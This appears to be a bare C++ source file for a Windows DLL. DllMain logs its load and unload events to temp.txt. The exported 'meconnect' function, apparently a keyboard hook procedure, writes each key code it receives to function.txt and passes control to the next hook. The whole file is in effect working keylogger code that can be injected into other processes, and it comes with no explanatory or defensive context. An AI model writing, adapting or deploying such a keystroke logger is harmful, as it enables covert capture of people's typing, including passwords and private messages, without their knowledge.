#include "afxwin.h"
//#include "stdafx.h"
#include <stdio.h>
#include <windows.h>

INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved) {
	/* open file */
	FILE *file;
	fopen_s(&file, "temp.txt", "a+");

	switch(Reason) {
		case DLL_PROCESS_ATTACH:
			fprintf(file, "DLL attach function called.\n");
			break;
		case DLL_PROCESS_DETACH:
			fprintf(file, "DLL detach function called.\n");
			break;
		case DLL_THREAD_ATTACH:
			fprintf(file, "DLL thread attach function called.\n");
			break;
		case DLL_THREAD_DETACH:
			fprintf(file, "DLL thread detach function called.\n");
			break;
	}

	/* close file */
	fclose(file);

	return TRUE;
}

extern "C" __declspec(dllexport) int meconnect(int code, WPARAM wParam, LPARAM lParam) {
	FILE *file;
	fopen_s(&file, "function.txt", "a+");
	//fprintf(file, "LPARAM: %d\n", lParam);
	//if (!(lParam & (1 << 31)) || lParam & (1 << 24)) fprintf(file, "%d\n", wParam);
	fprintf(file, "%c", wParam);
	//fprintf(file, "Function keyboard_hook called.\n");
	fclose(file);
	return(CallNextHookEx(NULL, code, wParam, lParam));
}
